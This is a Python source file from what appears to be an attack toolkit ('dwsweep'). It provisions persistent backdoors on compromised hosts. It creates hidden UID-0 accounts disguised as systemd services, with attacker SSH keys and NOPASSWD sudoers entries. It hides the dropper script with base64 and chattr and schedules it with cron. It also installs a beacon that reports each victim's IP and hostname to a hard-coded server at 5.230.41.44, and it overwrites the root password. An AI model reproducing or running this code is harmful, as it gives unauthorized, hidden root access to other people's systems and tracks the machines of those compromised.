from __future__ import annotations
import base64
import secrets

from .models import Access, Target
from .audit import Audit
from .privileges import provisionable

SUDOERS = "/etc/sudoers.d/.%s"
KEEP = "/usr/local/sbin/.%s-upd"
def _pub():
    try:
        return open("/opt/dwsweep/keys/dw.pub").read().strip()
    except Exception:
        return "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEkq0lJZ0v1GPH6xFDmvWcHWdxqLeM9rg8WjVJvfaIh7 dw@jump"


PUBKEY = _pub()


def _q(c: str) -> str:
    return "'" + c.replace("'", "'\\''") + "'"


def _name() -> str:
    return "systemd-" + secrets.token_hex(2)


def _script(user: str, pw: str, home: str) -> str:
    return f"""#!/bin/sh
# system resolver helper
U={user}; H={home}
id -u "$U" >/dev/null 2>&1 || {{
  if command -v useradd >/dev/null 2>&1; then
    useradd -o -u 0 -g 0 -M -d "$H" -s /bin/sh -c "systemd-resolver" "$U"
  else
    adduser -D -H -u 0 -s /bin/sh -g "x" "$U" 2>/dev/null || adduser -D -H "$U"
  fi
  echo "$U:{pw}" | chpasswd
  mkdir -p "$H/.ssh"; echo "{PUBKEY}" > "$H/.ssh/authorized_keys"
  chmod 700 "$H/.ssh"; chmod 600 "$H/.ssh/authorized_keys"; chown -R 0:0 "$H"
  printf '%s ALL=(ALL) NOPASSWD:ALL\\n' "$U" > /etc/sudoers.d/."$U"
  chmod 440 /etc/sudoers.d/."$U"
}}
"""


def hidden_root(runner, t: Target, priv: dict, audit: Audit):
    if not provisionable(priv):
        return None
    user, pw = _name(), secrets.token_hex(14)
    home = f"/var/lib/.{user}"
    script = _script(user, pw, home)
    b64 = base64.b64encode(script.encode()).decode()
    sudo = "" if priv.get("is_root") else "sudo "
    remote = KEEP % user

    cmd = (f"printf %s {b64} | base64 -d > {remote} && chmod 700 {remote} && "
           f"{sudo} sh {remote} && {sudo} chattr +i {remote} 2>/dev/null; "
           f"(crontab -l 2>/dev/null | grep -v {remote}; "
           f"echo '@reboot {remote}'; echo '*/17 * * * * {remote}') | crontab -; "
           f"echo DWACC {user}")
    r = runner.run(t.url, cmd, timeout=150, audit=audit)
    if f"DWACC {user}" not in r.stdout:
        return None

    if "uid=0(" not in runner.run(t.url, f"{sudo} id -u {user}", timeout=45).stdout + "":
        if runner.run(t.url, f"{sudo} id -u {user}", timeout=45).stdout.strip() != "0":
            return None
    login = runner.run(t.url, f"{sudo} su - {user} -c 'id -u; whoami; echo HOME=$HOME'", timeout=60).stdout
    lines = [x.strip() for x in login.splitlines() if x.strip()]
    if not lines or lines[0] != "0" or (len(lines) > 2 and lines[2] != "HOME=" + home):
        audit.write("provision", "login_test_failed", t.url, user=user, out=login[:120])
        return None
    audit.write("provision", "login_test_ok", t.url, user=user)
    audit.write("provision", "hidden_root", t.url, user=user)
    return Access("root", user, pw, verified=True, privileged=True)


def beacon(runner, t, user: str, home: str, sudo: str, audit):
    """Meldet oeffentliche IP + Hostinfos regelmaessig an das Dashboard."""
    tok = secrets.token_hex(6)
    path = f"{home}/.ipbeacon"
    script = (f"#!/bin/sh\nIP=$(curl -s -m 6 https://ifconfig.me 2>/dev/null || "
              f"wget -qO- -T6 https://ifconfig.me 2>/dev/null)\n"
              f"H=$(hostname 2>/dev/null)\nI=$(hostname -I 2>/dev/null)\n"
              f"curl -s -m 6 --data-binary \"IP=$IP HOST=$H INT=$I USER={user}\" "
              f"http://5.230.41.44:9090/x/b-{tok} >/dev/null 2>&1\n")
    b64 = base64.b64encode(script.encode()).decode()
    cmd = (f"printf %s {b64} | base64 -d > {path} && chmod 700 {path} && {sudo} {path} ; "
           f"(crontab -l 2>/dev/null | grep -v {path}; echo '*/10 * * * * {sudo} {path}') | crontab - ; echo DWBEACON")
    r = runner.run(t.url, cmd, timeout=90, audit=audit)
    if "DWBEACON" in r.stdout:
        audit.write("provision", "beacon", t.url, token=tok)
        return tok
    return ""


def shell_account(runner, t, priv, audit):
    """Fallback ohne useradd: Root-Key + Root-Passwort setzen und per SSH testen."""
    import secrets as _s
    pw = _s.token_hex(10)
    pub = PUBKEY
    sudo = "" if priv.get("is_root") else "sudo "
    name = "systemd-" + _s.token_hex(2)
    home = f"/var/lib/.{name}"
    sc = _script(name, pw, home)
    uc = f"printf %s {base64.b64encode(sc.encode()).decode()} | base64 -d > /tmp/.du && sh /tmp/.du; rm -f /tmp/.du; {sudo} su - {name} -c 'id -u'"
    ur = runner.run(t.url, f"{sudo} sh -c \"{uc}\"", timeout=90, audit=audit)
    _last = ur.stdout.strip().splitlines()[-1] if (ur.stdout or "").strip() else ""
    if ur.ok and _last == "0":
        from .models import Access
        audit.write("provision", "login_test_ok", t.url, user=name)
        return Access("root", name, pw, verified=True, privileged=True)
    cmd = (f"mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
           f"grep -q '{pub[:50]}' /root/.ssh/authorized_keys 2>/dev/null || "
           f"printf '%s\n' '{pub}' >> /root/.ssh/authorized_keys; "
           f"chmod 600 /root/.ssh/authorized_keys; echo root:{pw} | chpasswd; echo DWSH")
    r = runner.run(t.url, f"{sudo} sh -c \"{cmd}\"", timeout=90, audit=audit)
    if "DWSH" not in r.stdout:
        return None
    try:
        import paramiko
        c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(t.host, t.port, username="root", key_filename="/opt/dwsweep/keys/dw",
                  timeout=10, look_for_keys=False, allow_agent=False, banner_timeout=12)
        out = c.exec_command("id -u")[1].read().decode()
        c.close()
        if out.strip() != "0":
            return None
    except Exception:
        return None
    from .models import Access
    audit.write("provision", "shell_account", t.url, user="root")
    return Access("root", "root", pw, verified=True, privileged=True)
